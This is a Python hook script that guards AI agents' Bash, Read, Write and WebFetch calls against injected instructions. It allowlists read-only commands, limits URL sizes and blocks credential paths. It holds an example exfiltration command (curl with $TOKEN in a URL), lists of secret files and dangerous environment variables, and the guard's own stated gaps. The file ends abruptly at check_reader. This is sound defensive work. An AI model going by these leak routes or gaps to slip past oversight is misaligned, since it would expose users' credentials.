#!/usr/bin/env python3
"""PreToolUse guard for the /research, /spec and /cold-review agents (researcher,
research-verifier, spec-verifier, cold-reviewer).

Their safety rules say: no cloud CLIs, GitHub and git read-only, and (for the researcher) write
only notes in ~/notes/research. This makes those rules hold when a fetched page carries
instructions, and even though ~/.claude/settings.json pre-approves some cloud reads.

Bash commands are checked against an allowlist: every command word, including those inside
pipelines, lists, braces, if/while bodies and $(...) substitutions, must be a reading tool, curl,
gh, git or one of the skill scripts, and those have per-command limits (GET only, no file
writes). It's a guard against injected instructions, not a sandbox: data can still leave in a
GET request's URL.

So credentials are kept out of reach instead (see SECRET_HOME): no command word may name them,
nor may grep -r or rg search a directory that holds them, and the `read` mode refuses them to
the Read, Grep and Glob tools. For Bash this is best effort, since a path built at run time from
variables gets past it; for the tools it is exact, since the path arrives whole. Session history
(HISTORY_HOME) is refused the same way: the verifiers and the cold reviewer are only worth
running if they can't see how the document they check was written. The exception is the
agent's own saved tool output (SESSION_RESULTS).

Environment variables are checked too, because they change what an allowed command runs: git
runs GIT_EXTERNAL_DIFF through a shell, bash sources BASH_ENV, Python reads PYTHONPATH. A
`NAME=value` word before a command (or after `env` and the other wrappers) exports NAME to it,
so only locale and timezone variables may be set that way. A bare `NAME=value` sets a shell
variable, which later commands don't see unless NAME is already exported, so it's allowed unless
the name is dangerous (see `dangerous`). `for NAME in`, `read NAME` and `printf -v NAME` assign
too and get the same check.

Reading a variable is checked as well, because a variable's value can leave in a request URL just
as a file's can: `curl "https://host/?k=$TOKEN"`. A command may expand only variables it sets
itself (by assignment, `for`, `read` or `printf -v`) and a few harmless ones the shell keeps
(SAFE_VARS). Indirect expansion (`${!name}`) and jq's `env` and `$ENV` are refused outright.

Paths are compared after resolving symlinks too, so a link that points into ~/.aws is refused
like ~/.aws itself.

Request URLs are limited in size, since a GET request's URL is where data would leave. The limits
apply to what curl or gh actually sends, so a curl or gh argument may not expand anything whose
size the guard can't see: no $(...), backticks, or variable whose value came from a command's
output or from input (see `tainted_names`); a variable set to fixed words, such as a `for` loop
over a literal list, is fine. Nor may curl read a header or URL from a file (`-H @file`). Then: a
host
name of at most MAX_HOST characters, at most MAX_AFTER_HOST after it, no user name or password
in the URL, and no curl or gh argument over MAX_ARG characters. Real requests stay well inside
these (the longest in the agents' transcripts to 2026-09-24 had a 43-character host and 206
characters after it). It doesn't stop a leak, it slows one to a few hundred characters a request.
The WebFetch tool gets the same check through the `fetch` mode.

Usage, from an agent's frontmatter hooks:
  agent-guard.py bash            Bash tool
  agent-guard.py read            Read, Grep and Glob tools: no credentials
  agent-guard.py write <dir>     Write/Edit tools: allow only files under <dir>
  agent-guard.py fetch           WebFetch tool: the URL size limits

Reads the hook's JSON on stdin. Exit 0 allows; exit 2 blocks and tells the agent why on stderr.
"""

import json
import os
import re
import shlex
import sys
from pathlib import Path
from urllib.parse import urlsplit
from typing import NoReturn

HOME = Path.home()
# Resolved, like the command paths they're compared with, because ~/.claude/skills is a symlink
# into the claude-skills repo: an unresolved entry would never match.
SCRIPTS = {
    (HOME / path).resolve()
    for path in (
        ".claude/skills/research/scripts/repo-health.sh",
        ".claude/skills/research/scripts/check-note.py",
        ".claude/skills/research/scripts/gcp-skus.sh",
        ".claude/skills/research/scripts/reddit-search.sh",
        ".claude/skills/spec/scripts/check-spec.py",
    )
}
# Reading and text tools that can't run other programs or write files (the flags that would
# are checked below).
READERS = {
    "cat", "head", "tail", "wc", "sort", "uniq", "cut", "tr", "grep", "egrep", "fgrep", "rg",
    "jq", "diff", "comm", "paste", "column", "nl", "fold", "iconv", "basename", "dirname",
    "realpath", "readlink", "ls", "stat", "file", "du", "echo", "printf", "true", "false",
    "test", "[", "date", "pwd", "cd", "sleep", "base64", "zcat", "gunzip", "gzip", "od",
    "shasum", "md5", "sha256sum", "sed", "find", ":", "[[", "read",
}  # fmt: skip
ASSIGNMENT = re.compile(r"([A-Za-z_]\w*)=(.*)", re.DOTALL)
NAME = re.compile(r"[A-Za-z_]\w*")
# The only variables that may be exported to a command with a prefix or `env`: they change
# locale and time formatting, not what runs.
PREFIX_OK = {"LC_ALL", "LANG", "TZ"}
# Variables the shell itself reads, dangerous even when not yet exported.
SHELL_VARS = {
    "PATH", "HOME", "IFS", "CDPATH", "GLOBIGNORE", "BASH_ENV", "ENV", "SHELLOPTS", "BASHOPTS",
    "PS4",
}  # fmt: skip
# Names the Bash tool's shell exports but the hook's own environment lacks, so `os.environ`
# can't catch them (compared on 2026-09-15; CLAUDE* is covered by the prefix below).
SHELL_EXPORTED = {
    "AI_AGENT",
    "COREPACK_ENABLE_AUTO_PIN",
    "NoDefaultCurrentDirectoryInExePath",
}
# Families that git, Python, curl, the dynamic loader, ssh and gh read from the environment,
# and Claude Code's own session variables.
DANGEROUS_PREFIXES = (
    "GIT_",
    "PYTHON",
    "CURL_",
    "LD_",
    "DYLD_",
    "SSH_",
    "GH_",
    "CLAUDE",
)
# Variables any command may expand: the shell sets them, and they hold no secrets.
SAFE_VARS = {
    "HOME", "PWD", "OLDPWD", "RANDOM", "LINENO", "SECONDS", "EPOCHSECONDS", "EPOCHREALTIME",
    "PPID", "UID", "EUID", "TMPDIR", "REPLY", "OPTARG", "OPTIND",
}  # fmt: skip
JQ_STRING = re.compile(r'"(?:\\.|[^"\\])*"')
VAR_REF = re.compile(r"\$\{?([A-Za-z_]\w*)")
# `read` options that take a value; -a's value is an array name, so it's checked too.
READ_ARG_OPTS = set("adinNptu")
CLOUD = {
    "aws", "gcloud", "gsutil", "bq", "az", "kubectl", "helm", "terraform", "tofu", "eksctl",
    "kubectx", "kubens", "k9s", "pulumi", "doctl", "flux", "argocd", "kustomize",
}  # fmt: skip
KEYWORDS = {
    "if",
    "then",
    "else",
    "elif",
    "fi",
    "do",
    "done",
    "while",
    "until",
    "{",
    "}",
    "!",
}
# Wrappers that run the command after their own options: name -> options that take a value.
WRAPPERS = {
    "env": {"-u", "--unset", "-C", "--chdir"},
    "timeout": {"-s", "--signal", "-k", "--kill-after"},
    "nice": {"-n", "--adjustment"},
    "time": set(),
    "command": set(),
    "nohup": set(),
    "xargs": {
        "-n",
        "-L",
        "-P",
        "-s",
        "-I",
        "-d",
        "-E",
        "-a",
        "--max-args",
        "--max-procs",
    },
}
GIT_READ = {
    "log", "show", "diff", "blame", "grep", "ls-files", "ls-tree", "rev-parse", "status",
    "cat-file", "describe", "shortlog", "rev-list", "merge-base", "name-rev", "for-each-ref",
    "show-ref", "whatchanged", "branch", "tag", "remote", "reflog", "count-objects",
}  # fmt: skip
GIT_BAD_ARGS = (
    "--output", "-O", "--open-files-in-pager", "--exec-path", "--ext-diff", "--textconv",
)  # fmt: skip
# git's own options, before the subcommand, that are allowed: an allowlist, since the others
# include -p/--paginate (starts core.pager), --git-dir and --work-tree (a config the agent may
# have written), -c and --config-env (aliases and any config value).
GIT_TOP_OPTS = {
    "--no-pager", "-P", "--literal-pathspecs", "--glob-pathspecs", "--noglob-pathspecs",
    "--icase-pathspecs", "--no-optional-locks", "--no-replace-objects", "--version", "--help",
}  # fmt: skip
GH_READ = {
    ("api",), ("search",), ("auth", "status"), ("repo", "view"), ("release", "list"),
    ("release", "view"), ("issue", "list"), ("issue", "view"), ("pr", "list"), ("pr", "view"),
    ("run", "list"), ("run", "view"),
}  # fmt: skip
# curl short options that take a value, and the options that write files or send data.
CURL_ARG_SHORT = set("AbcCdDeEFHKmorTuUwxXyYzQ")
CURL_BLOCK_SHORT = set("oOcKTdFD")
CURL_BLOCK_LONG = (
    "--output", "--remote-name", "--output-dir", "--dump-header", "--cookie-jar", "--config",
    "--upload-file", "--data", "--json", "--form", "--create-dirs", "--trace", "--libcurl",
    "--stderr", "--etag-save", "--hsts", "--alt-svc", "--url-query", "--variable", "--expand-",
)  # fmt: skip
# URL size limits: see the module docstring.
MAX_HOST, MAX_AFTER_HOST, MAX_ARG = 80, 400, 450
URL_IN_WORD = re.compile(r"[a-zA-Z][\w+.-]*://[^\s'\"<>]+")
BARE_HOST = re.compile(r"[\w-]+(?:\.[\w-]+)+(?::\d+)?(?:[/?#].*)?")
PUNCT = set("();<>|&")
# Credentials no agent needs to read. A fetched page can still make an agent send data out in a
# GET request's URL, so the data it can reach is what has to be limited. Keep the home entries in
# step with `denyRead` in ~/.claude/skills/spec/spike-settings.json, which can't take all of
# ~/.config: git and uv read their own config there.
SECRET_HOME = tuple(
    HOME / p
    for p in (
        ".ssh", ".aws", ".kube", ".gnupg", ".docker", ".azure", ".config", ".netrc",
        ".git-credentials", ".npmrc", ".pypirc", ".claude.json", ".claude/.credentials.json",
    )
)  # fmt: skip
# Session history: transcripts, prompt history, file snapshots and the agents' own briefs and
# replies. No agent needs it, and a cold reviewer that could read the session that wrote a
# document wouldn't be cold. Keep in step with `denyRead` in ~/.claude/hooks/agent-sandbox.json.
HISTORY_HOME = tuple(
    HOME / p
    for p in (
        ".claude/projects", ".claude/history.jsonl", ".claude/file-history", ".claude/sessions",
        ".claude/session-env", ".claude/shell-snapshots", ".claude/paste-cache",
        ".cache/agent-runs",
    )
)  # fmt: skip
PRIVATE_HOME = SECRET_HOME + HISTORY_HOME
# The one part of the history an agent may read: its own session's saved tool output, which
# Claude Code writes under ~/.claude/projects and points the agent at when a result is too long
# to show. Set from the hook input's transcript path and session ID in main().
SESSION_RESULTS = None
# The same directories and files anywhere, e.g. a relative `.aws/credentials` read from ~.
SECRET_NAMES = {
    ".ssh",
    ".aws",
    ".kube",
    ".gnupg",
    ".azure",
    ".netrc",
    ".git-credentials",
}
# Files that hold credentials or Terraform state wherever they are. `.env.example` and its
# kin are templates, so they're readable.
SECRET_FILE = re.compile(
    r"(?:^|/)(?:\.env(?:\.(?!example$|sample$|template$|dist$)[\w.-]+)?"
    r"|[^/]*\.tfvars(?:\.json)?|[^/]*\.tfstate(?:\.backup)?|[^/]*\.(?:pem|p12|pfx)"
    r"|id_(?:rsa|dsa|ecdsa|ed25519))$"
)
# curl reads local files through file:// URLs; other URLs are fetched, not read.
FILE_URL = re.compile(r"^file://(?:localhost)?(?=[/~$])")
URL = re.compile(r"[a-zA-Z][\w+.-]*://")
CWD = os.getcwd()  # replaced by the hook input's cwd in main()


def block(reason) -> NoReturn:
    print(f"Blocked by agent-guard: {reason}", file=sys.stderr)
    sys.exit(2)


def substitutions(command):
    """Contents of every $(...), <(...) and `...` outside single quotes, and whether the command
    expands a variable outside single quotes."""
    subs, expands, i, quote = [], False, 0, None
    while i < len(command):
        ch = command[i]
        if quote == "'":
            quote = None if ch == "'" else quote
        elif ch == "\\":
            i += 1
        elif ch == "'" and quote is None:
            quote = "'"
        elif ch == '"':
            quote = None if quote == '"' else '"'
        elif ch == "`":
            end = command.find("`", i + 1)
            subs.append(command[i + 1 : end if end > 0 else len(command)])
            i = end if end > 0 else len(command)
        elif ch in "$<" and command[i + 1 : i + 2] == "(":
            depth, j = 1, i + 2
            while j < len(command) and depth:
                depth += {"(": 1, ")": -1}.get(command[j], 0)
                j += 1
            subs.append(command[i + 2 : j - 1])
            i = j - 1
        elif ch == "$" and re.match(r"[\w{]", command[i + 1 : i + 2]):
            expands = True
        i += 1
    return subs, expands


def variable_refs(command):
    """Names of the variables a command expands outside single quotes, and whether it uses
    indirect expansion (`${!name}`), which can reach any variable. Substitutions are skipped
    here, as in `substitutions`: check_command checks each one on its own."""
    names, indirect, i, quote = set(), False, 0, None
    while i < len(command):
        ch = command[i]
        if quote == "'":
            quote = None if ch == "'" else quote
        elif ch == "\\":
            i += 1
        elif ch == "'" and quote is None:
            quote = "'"
        elif ch == '"':
            quote = None if quote == '"' else '"'
        elif ch == "`":
            end = command.find("`", i + 1)
            i = end if end > 0 else len(command)
        elif ch in "$<" and command[i + 1 : i + 2] == "(":
            depth, j = 1, i + 2
            while j < len(command) and depth:
                depth += {"(": 1, ")": -1}.get(command[j], 0)
                j += 1
            i = j - 1
        elif ch == "$":
            if command[i + 1 : i + 3] == "{!":
                indirect = True
            elif m := VAR_REF.match(command, i):
                names.add(m.group(1))
        i += 1
    return names, indirect


def assigned_names(command, depth=0):
    """Variables a command sets itself: by assignment, `for`, `select`, `read` or `printf -v`,
    here or in any $(...) inside it. Generous on purpose: it only decides which variables the
    command may expand, and setting a dangerous one is refused elsewhere."""
    if depth > 4:
        return set()
    names = set()
    for sub in substitutions(command)[0]:
        names |= assigned_names(sub, depth + 1)
    for raw in simple_commands(tokens(command)):
        words = list(raw)
        while words and (words[0] in KEYWORDS or ASSIGNMENT.fullmatch(words[0])):
            if m := ASSIGNMENT.fullmatch(words[0]):
                names.add(m.group(1))
            words = words[1:]
        if not words:
            continue
        name, args = os.path.basename(words[0]), words[1:]
        if name in ("for", "select") and args:
            names.add(args[0])
        elif name == "read":
            names.update(read_variables(args))
        elif name == "printf":
            for k, arg in enumerate(args[:-1]):
                if arg == "-v":
                    names.add(args[k + 1])
    return names


def assignment_values(command):
    """(name, value text) for every `NAME=value` in a command, `for`/`select` lists included,
    read from the raw text so a value keeps its $(...) and quotes. Generous on purpose: a match
    inside a quoted string only makes more variables count as tainted."""
    out = []
    for m in re.finditer(r"(?:^|(?<=[\s;&|(`{]))([A-Za-z_]\w*)\+?=", command):
        i, quote, depth = m.end(), None, 0
        while i < len(command):
            ch = command[i]
            if quote == "'":
                quote = None if ch == "'" else quote
            elif ch == "\\":
                i += 1
            elif ch in "'\"" and quote is None:
                quote = ch
            elif ch == '"' and quote == '"':
                quote = None
            elif quote is None and ch == "(":
                depth += 1
            elif quote is None and ch == ")":
                if not depth:
                    break
                depth -= 1
            elif quote is None and not depth and (ch.isspace() or ch in ";&|"):
                break
            i += 1
        out.append((m.group(1), command[m.end() : i]))
    for m in re.finditer(
        r"\b(?:for|select)\s+([A-Za-z_]\w*)\s+in\b(.*?)(?:;|\n|\bdo\b|$)", command, re.DOTALL
    ):
        out.append((m.group(1), m.group(2)))
    return out


# Text tools that, given no files, only transform what they're handed: a $(...) built from them
# over fixed words and untainted variables brings in nothing private. SCRIPTED take a script
# or pattern as their first operand; any other operand of any of them is a file.
PURE = {"echo", "printf", "tr", "sed", "jq", "grep", "cut", "head", "tail", "sort", "uniq",
        "wc", "base64", "paste", "fold", "rev", "curl"}  # fmt: skip
SCRIPTED = {"sed", "jq", "grep"}
DATA_OPERANDS = {"echo", "printf", "tr"}  # their operands are text, never files
FILE_OPTS = ("-f", "--file", "--from-file", "--rawfile", "--slurpfile", "--args", "--jsonargs")
# Options whose values are text, not files: name -> how many words follow.
VALUE_OPTS = {"--arg": 2, "--argjson": 2, "--indent": 1, "-e": 1, "--expression": 1,
              "--regexp": 1, "-d": 1, "-c": 1, "-n": 0}  # fmt: skip


def simple_commands_or_none(command):
    """simple_commands(tokens(command)), or None where the text doesn't parse on its own."""
    lexer = shlex.shlex(
        command.replace("\\\n", " ").replace("\n", " ; "), posix=True, punctuation_chars=True
    )
    lexer.whitespace_split = True
    lexer.commenters = ""
    try:
        toks = list(lexer)
    except ValueError:
        return None
    try:
        return simple_commands(toks)
    except SystemExit:  # a redirection simple_commands refuses: not pure either
        return None


def pure(sub, tainted, depth=0):
    """True if a $(...) can only transform fixed text: every command in it is in PURE with no
    file operand or file option, it redirects nothing in, it expands no tainted variable, and
    any $(...) inside it is pure too."""
    if depth > 4 or "<" in sub or "`" in sub or set(VAR_REF.findall(sub)) & tainted:
        return False
    if not all(pure(inner, tainted, depth + 1) for inner in substitutions(sub)[0]):
        return False
    commands = simple_commands_or_none(sub)
    if commands is None:
        return False
    for raw in commands:
        words = [w for w in raw if w not in KEYWORDS and not ASSIGNMENT.fullmatch(w)]
        if not words:
            continue
        name, args = os.path.basename(words[0]), words[1:]
        if name not in PURE or any(a.startswith(FILE_OPTS) and a not in VALUE_OPTS for a in args):
            return False
        if name in DATA_OPERANDS:
            continue
        if name == "curl":
            # Over http(s) curl returns only what the web holds; file:// would read a local file.
            if any("://" in a and not a.lower().startswith(("http://", "https://")) for a in args):
                return False
            continue
        operands, k, scripted = [], 0, False
        while k < len(args):
            if args[k] in VALUE_OPTS:
                scripted = scripted or args[k] in ("-e", "--expression", "--regexp")
                k += 1 + VALUE_OPTS[args[k]]
                continue
            if not args[k].startswith("-"):
                operands.append(args[k])
            k += 1
        if operands[1 if name in SCRIPTED and not scripted else 0 :]:
            return False
    return True


def tainted_names(command, depth=0):
    """Variables whose value comes from a command's output or from input: assigned from
    a $(...) that reads a file, input or the network (see `pure`), backticks or another tainted
    variable; looped over a list that does; or filled by `read` or `printf -v`. A request may not carry them (check_request_words), since their
    size and content can't be seen here."""
    if depth > 4:
        return set()
    tainted = set()
    for sub in substitutions(command)[0]:
        tainted |= tainted_names(sub, depth + 1)
    for raw in simple_commands_or_none(command) or []:
        words = [w for w in raw if w not in KEYWORDS and not ASSIGNMENT.fullmatch(w)]
        if not words:
            continue
        name, args = os.path.basename(words[0]), words[1:]
        if name == "read":
            tainted.update(read_variables(args))
        elif name == "printf":
            tainted.update(args[k + 1] for k, a in enumerate(args[:-1]) if a == "-v")
    values = assignment_values(command)
    changed = True
    while changed:
        changed = False
        for name, value in values:
            if name in tainted:
                continue
            if (
                "`" in value
                or set(VAR_REF.findall(value)) & tainted
                or not all(pure(sub, tainted) for sub in substitutions(value)[0])
            ):
                tainted.add(name)
                changed = True
    return tainted


def check_variables(command, local):
    """Refuse expanding a variable the command didn't set: it may hold a token."""
    names, indirect = variable_refs(command)
    if indirect:
        block("indirect expansion (`${!name}`) can read any variable; not allowed")
    if outside := sorted(names - local - SAFE_VARS):
        block(
            f"`${outside[0]}` expands a variable this command didn't set. Environment variables "
            "can hold tokens, which could leave in a request URL; set your own variables in "
            "the same command, with lowercase names"
        )


def tokens(command):
    lexer = shlex.shlex(
        command.replace("\\\n", " ").replace("\n", " ; "),
        posix=True,
        punctuation_chars=True,
    )
    lexer.whitespace_split = True
    lexer.commenters = ""
    try:
        return list(lexer)
    except ValueError:
        block("couldn't parse the command (unbalanced quotes?)")


def simple_commands(toks):
    """Split tokens into simple commands, dropping redirections after checking them."""
    commands, current, i = [], [], 0
    while i < len(toks):
        tok = toks[i]
        if tok and set(tok) <= PUNCT:
            if ">" in tok:
                target = toks[i + 1] if i + 1 < len(toks) else ""
                if not (
                    target == "/dev/null"
                    or (tok.endswith("&") and re.fullmatch(r"\d|-", target))
                ):
                    block(
                        "redirecting output to a file; these agents may not write files from Bash"
                    )
                i += 2
                continue
            if set(tok) <= {"<"}:  # input redirection or a here-string: reads only
                i += 2
                continue
            commands.append(current)
            current = []
        else:
            current.append(tok)
        i += 1
    commands.append(current)
    return [c for c in commands if c]


def dangerous(name):
    """True if assigning NAME, even without exporting it, can change what later commands run."""
    return (
        name in os.environ
        or name in SHELL_VARS
        or name in SHELL_EXPORTED
        or name.startswith(DANGEROUS_PREFIXES)
        or name.lower().endswith("_proxy")
    )


def prefix_ok(name, command):
    return (
        name in PREFIX_OK
        or name.startswith("LC_")
        or (
            name == "IFS" and command == "read"
        )  # `IFS= read -r line` splits only that read
    )


def check_bare_name(name):
    """A shell variable being set by a bare assignment, `for`, `read` or `printf -v`."""
    if not NAME.fullmatch(name):
        block(f"`{name}` isn't a plain variable name")
    if dangerous(name) and not prefix_ok(name, None):
        block(
            f"`{name}` is a variable the shell or later commands read (it's exported, or it "
            "controls git, Python, curl, ssh, gh or the shell), so it can change what an "
            "allowed command runs. Use a lowercase name for your own shell variables"
        )


def check_assignments(names, command, bare):
    if bare:
        for name in names:
            check_bare_name(name)
        return
    for name in names:
        if not prefix_ok(name, command):
            block(
                f"`{name}=...` sets an environment variable for the command, and environment "
                "variables can change what an allowed command runs (GIT_EXTERNAL_DIFF, "
                "BASH_ENV, PYTHONPATH). Only LC_ALL, LANG, TZ and LC_* may be set this way"
            )


def unwrap(argv):
    """Strip assignments, shell keywords and wrappers like timeout, returning the real command.
    Assignments are checked on the way: see the module docstring."""
    assigned, wrapped = [], False
    while argv:
        word = argv[0]
        if m := ASSIGNMENT.fullmatch(word):
            assigned.append(m.group(1))
            argv = argv[1:]
            continue
        if word in KEYWORDS:
            argv = argv[1:]
            continue
        name = os.path.basename(word)
        if name not in WRAPPERS:
            break
        if name == "env" and any(a in ("-S", "--split-string") for a in argv[1:]):
            block("`env -S` hides the command it runs")
        wrapped = True
        with_value, rest = WRAPPERS[name], argv[1:]
        while rest and (rest[0].startswith("-") or ASSIGNMENT.fullmatch(rest[0])):
            if m := ASSIGNMENT.fullmatch(rest[0]):
                assigned.append(m.group(1))  # after a wrapper, always exported
            rest = rest[2:] if rest[0] in with_value else rest[1:]
        if name == "timeout" and rest:
            rest = rest[1:]  # the duration
        argv = rest
    if wrapped and not argv:
        # `env` alone prints the environment, tokens included; the other wrappers do nothing
        # useful without a command.
        block("a wrapper like `env` with no command after it prints the environment; not allowed")
    command = os.path.basename(argv[0]) if argv else None
    check_assignments(assigned, command, bare=not argv and not wrapped)
    return argv


def read_variables(args):
    """The variable names `read` assigns: its operands, and -a's array name."""
    names, i = [], 0
    while i < len(args):
        arg = args[i]
        if arg == "--":
            names += args[i + 1 :]
            break
        if arg.startswith("-") and len(arg) > 1:
            for j, letter in enumerate(arg[1:]):
                if letter in READ_ARG_OPTS:
                    value = arg[j + 2 :] or (args[i + 1] if i + 1 < len(args) else "")
                    if not arg[j + 2 :]:
                        i += 1  # the value was the next word
                    if letter == "a":
                        names.append(value)
                    break
        else:
            names.append(arg)
        i += 1
    return names


def check_gh(args, raw, expands, clean=frozenset(), tainted=frozenset()):
    sub = tuple(a for a in args[:2] if not a.startswith("-"))
    if not any(sub[: len(allowed)] == allowed for allowed in GH_READ):
        block(f"`gh {' '.join(sub)}` can change GitHub; only read commands are allowed")
    if sub[:1] != ("api",):
        return
    check_request_words(args, "gh", clean, tainted)
    # gh runs outside the OS sandbox (Go fails TLS under it; see hooks/agent-sandbox.json), so
    # nothing but this stops it reading a file into a request, or sending one elsewhere.
    sent = [a for k, a in enumerate(args) if not (k and args[k - 1] in ("--jq", "-q", "--template", "-t"))
            and not a.startswith(("--jq=", "--template="))]
    if any(re.search(r"(?:^|=)@", a) for a in sent if not a.startswith("-") or "=" in a):
        block("`gh api` with an `@file` value sends a file's contents; give values inline")
    endpoint = next((a for a in args[1:] if not a.startswith("-")), "")
    if "://" in endpoint:
        block("`gh api` takes a path on api.github.com, not a full URL")
    if any(a.startswith("--hostname") for a in args):
        block("`gh api --hostname` sends the request, and maybe a token, to another host")
    method = None
    for i, arg in enumerate(args):
        if arg in ("-X", "--method") and i + 1 < len(args):
            method = args[i + 1]
        elif arg.startswith("--method="):
            method = arg.split("=", 1)[1]
        elif arg.startswith("-X") and len(arg) > 2:
            method = arg[2:]
    if method and method.upper() != "GET":
        block(f"`gh api` with method {method}: GET only")
    fields = [
        a
        for a in args
        if a.startswith(("-f", "-F", "--field", "--raw-field", "--input"))
    ]
    endpoint = next((a for a in args[1:] if not a.startswith("-")), "")
    if endpoint and endpoint != "graphql" and "://" not in endpoint:
        check_url("https://api.github.com/" + endpoint.lstrip("/"))
    if endpoint != "graphql":
        if fields and not method:
            block(
                "`gh api` field flags switch a REST call to POST; put parameters in the URL, or add -X GET"
            )
        return
    if any(a.startswith("--input") for a in args) or re.search(r"=@", " ".join(args)):
        block("GraphQL queries must be given inline, not from a file or stdin")
    if expands or re.search(r"\$\(|`", raw):
        block(
            "GraphQL queries must be literal: no $(...) or shell variables in a gh api graphql command"
        )
    # The query is literal (checked above), so the operation type can be read from it. A search
    # for the words "mutation testing" is fine; `mutation {` or `mutation Name(` is not.
    if re.search(r"\bmutation\s*(?:\w+\s*)?[({]", " ".join(args), re.IGNORECASE):
        block("GraphQL mutations aren't allowed; queries only")


def check_git(args):
    i = 0
    while i < len(args) and args[i].startswith("-"):
        if args[i] == "-C":
            i += 2
            continue
        if args[i] == "-c" or args[i].startswith("--config-env"):
            block("`git -c` can run arbitrary programs through aliases; not allowed")
        if args[i] not in GIT_TOP_OPTS:
            block(
                f"`git {args[i]}` isn't allowed before the subcommand: git's own options may "
                "start a pager or read another config. Use `git -C <dir>` to choose the repo"
            )
        i += 1
    if i >= len(args):
        return
    sub, rest = args[i], args[i + 1 :]
    if sub not in GIT_READ:
        block(
            f"`git {sub}` isn't a read-only git command; these agents are read-only in git"
        )
    if any(a.startswith(GIT_BAD_ARGS) for a in rest):
        block("that git option writes a file or runs another program")
    flags = [a for a in rest if a.startswith("-")]
    positional = [a for a in rest if not a.startswith("-")]
    if sub == "branch" and (
        set(flags) & {"-d", "-D", "-m", "-M", "-c", "-C", "-f", "-u", "--delete", "--move",
                      "--copy", "--force", "--set-upstream-to", "--unset-upstream", "--edit-description"}
        or (positional and not set(flags) & {"--contains", "--no-contains", "--merged",
                                              "--no-merged", "--points-at", "--list", "-l"})
    ):  # fmt: skip
        block("`git branch` may only list branches")
    if (
        sub == "tag"
        and positional
        and not set(flags) & {"-l", "--list", "--contains", "--points-at"}
    ):
        block("`git tag` may only list tags")
    if sub == "remote" and positional and positional[0] not in ("show", "get-url"):
        block("`git remote` may only show remotes")
    if sub == "reflog" and positional and positional[0] != "show":
        block("`git reflog` may only show the reflog")


def check_url(url):
    """Refuse a URL whose shape could carry data out: see the module docstring."""
    try:
        parts = urlsplit(url if "://" in url else "http://" + url)
        host = parts.hostname or ""
    except ValueError:
        block(f"couldn't parse the URL {url[:80]!r}")
    if parts.username or parts.password:
        block("a user name or password in a URL can carry data out; not allowed")
    if len(host) > MAX_HOST or any(len(label) > 63 for label in host.split(".")):
        block(
            f"the host name is {len(host)} characters; over {MAX_HOST}, a host name can carry "
            "data out"
        )
    after = len(url) - url.find(parts.netloc) - len(parts.netloc)
    if after > MAX_AFTER_HOST:
        block(
            f"the URL has {after} characters after the host, over the {MAX_AFTER_HOST} "
            "allowed: a long URL can carry data out. Fetch the page without the extra "
            "query, or split the search into shorter ones"
        )


def check_request_words(args, tool, clean=frozenset(), tainted=frozenset()):
    """Size limits on every word of a curl or gh command, and on each URL in it, and no
    expansion the limits can't see: only `$name` for a variable in `clean` (set in this
    command to fixed words) or SAFE_VARS. gh's --jq and --template values are exempt: gh
    applies them to the reply, they're never sent."""
    exempt = {"--jq", "-q", "--template", "-t"} if tool == "gh" else set()
    for k, arg in enumerate(args):
        if arg.startswith(("--jq=", "--template=")) and tool == "gh":
            continue
        if k and args[k - 1] in exempt:
            continue
        rest = arg
        for inner in substitutions(arg)[0]:
            if pure(inner, tainted):
                rest = rest.replace(f"$({inner})", "")
        rest = re.sub(
            r"\$\{?([A-Za-z_]\w*)\}?",
            lambda m: "" if m.group(1) in clean or m.group(1) in SAFE_VARS else m.group(0),
            rest,
        )
        if "$" in rest or "`" in rest:
            block(
                f"a {tool} argument expands something whose size and content can't be checked "
                f"here ({arg[:60]!r}): no $(...), backticks, or variables set from a command's "
                "output or from input. Put the literal value in the command"
            )
        if len(arg) > MAX_ARG:
            block(
                f"a {tool} argument of {len(arg)} characters, over the {MAX_ARG} allowed: "
                "long arguments can carry data out in a request"
            )
        for url in URL_IN_WORD.findall(arg):
            check_url(url)
        if "://" not in arg and not arg.startswith("-") and BARE_HOST.fullmatch(arg):
            check_url(arg)


def check_curl(args, clean=frozenset(), tainted=frozenset()):
    check_request_words(args, "curl", clean, tainted)
    if any(
        (a.startswith("--write-out") or re.fullmatch(r"-[a-zA-Z]*w.*", a) or a == "-w")
        and "%output{" in " ".join(args)
        for a in args
    ):
        block("`curl -w '%output{…}'` writes a file; these agents only read")
    method, i = None, 0
    while i < len(args):
        arg = args[i]
        if arg.startswith("--"):
            name, _, value = arg.partition("=")
            if name.startswith(CURL_BLOCK_LONG):
                if name in (
                    "--dump-header",
                    "--trace",
                    "--trace-ascii",
                    "--stderr",
                ) and ((value or (args[i + 1] if i + 1 < len(args) else "")) == "-"):
                    i += 2
                    continue
                block(
                    f"`curl {name}` writes a file or sends data; these agents only read"
                )
            if name == "--request":
                method = value or (args[i + 1] if i + 1 < len(args) else "")
            if name in ("--header", "--proxy-header", "--url") and (
                value or (args[i + 1] if i + 1 < len(args) else "")
            ).startswith("@"):
                block(f"`curl {name} @file` sends a file's contents; give the value inline")
        elif arg.startswith("-") and len(arg) > 1:
            letters = arg[1:]
            for j, letter in enumerate(letters):
                if letter in CURL_BLOCK_SHORT:
                    value = letters[j + 1 :] or (
                        args[i + 1] if i + 1 < len(args) else ""
                    )
                    if letter == "D" and value == "-":
                        break
                    block(
                        f"`curl -{letter}` writes a file or sends data; these agents only read"
                    )
                if letter == "H" and (
                    letters[j + 1 :] or (args[i + 1] if i + 1 < len(args) else "")
                ).startswith("@"):
                    block("`curl -H @file` sends a file's contents; give the header inline")
                if letter == "X":
                    method = letters[j + 1 :] or (
                        args[i + 1] if i + 1 < len(args) else ""
                    )
                    break
                if letter in CURL_ARG_SHORT:
                    break  # the rest of the token, or the next one, is this option's value
        i += 1
    if method and method.upper() not in ("GET", "HEAD"):
        block(f"`curl -X {method}`: GET and HEAD only")


def sed_script_writes(script):
    """True if a sed script uses w/W/e commands, or s///w or s///e flags."""
    for cmd in re.split(r"[;\n]", script):
        cmd = re.sub(
            r"^\s*(?:\d+|\$|/(?:\\.|[^/])*/)?(?:\s*,\s*(?:\d+|\$|/(?:\\.|[^/])*/))?\s*!?\s*",
            "",
            cmd,
        )
        if cmd[:1] in ("w", "W", "e"):
            return True
        if cmd[:1] == "s" and len(cmd) > 1:
            delim, parts, k, buf = cmd[1], [], 2, ""
            while k < len(cmd) and len(parts) < 2:
                if cmd[k] == "\\":
                    buf += cmd[k : k + 2]
                    k += 2
                    continue
                if cmd[k] == delim:
                    parts.append(buf)
                    buf = ""
                else:
                    buf += cmd[k]
                k += 1
            if re.search(r"[we]", cmd[k:].split("}")[0]):
                return True
    return False


def check_reader(name, args):
